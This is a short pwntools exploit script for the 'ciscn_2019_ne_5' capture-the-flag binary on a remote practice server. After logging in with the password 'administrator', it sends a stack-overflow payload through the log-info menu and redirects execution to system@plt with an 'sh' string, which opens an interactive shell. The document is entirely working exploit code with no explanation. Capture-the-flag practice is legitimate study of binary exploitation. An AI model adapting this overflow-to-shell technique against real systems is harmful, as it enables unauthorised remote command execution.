from pwn import *
context.log_level = 'debug'
# io = process('./ciscn_2019_ne_5')
io = remote('node4.buuoj.cn',29128)
elf = ELF('./ciscn_2019_ne_5')

sh_addr = next(elf.search(b'sh'))
system_plt = elf.plt['system']
exit_addr = 0x8048923
payload = cyclic(0x48+4) + p32(system_plt) + p32(exit_addr) + p32(sh_addr)

io.sendlineafter(b'Please input admin password:',b'administrator')
io.sendlineafter(b'0.Exit\n:',b'1')
io.sendlineafter(b'Please input new log info:',payload)
io.sendlineafter(b'0.Exit\n:',b'4')
io.interactive()
